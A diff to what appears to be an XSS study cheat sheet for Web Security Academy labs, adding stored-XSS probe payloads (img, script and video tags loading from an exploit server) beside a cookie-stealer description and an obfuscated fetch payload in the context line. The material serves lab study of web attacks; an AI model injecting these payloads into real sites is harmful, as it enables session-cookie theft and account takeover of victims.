@@ -302,6 +302,14 @@ https://TARGET.web-security-academy.net/?SearchTerm="+eval(atob("fetch("https://
   
 ### Stored XSS
 
+>Use following sample code to identify stored XSS, if stored input is redirecting victim that click or following the links to our exploit server.  
+
+```HTML
+<img src="https://EXPLOIT.net/img">
+<script src="https://EXPLOIT.net/script"></script>
+<video src="https://EXPLOIT.net/video"></video>
+```  
+  
 >Cross site Scriting saved in Blog post comment. This Cookie Stealer payload then send the victim session cookie to the exploit server logs.  
 
 ```html
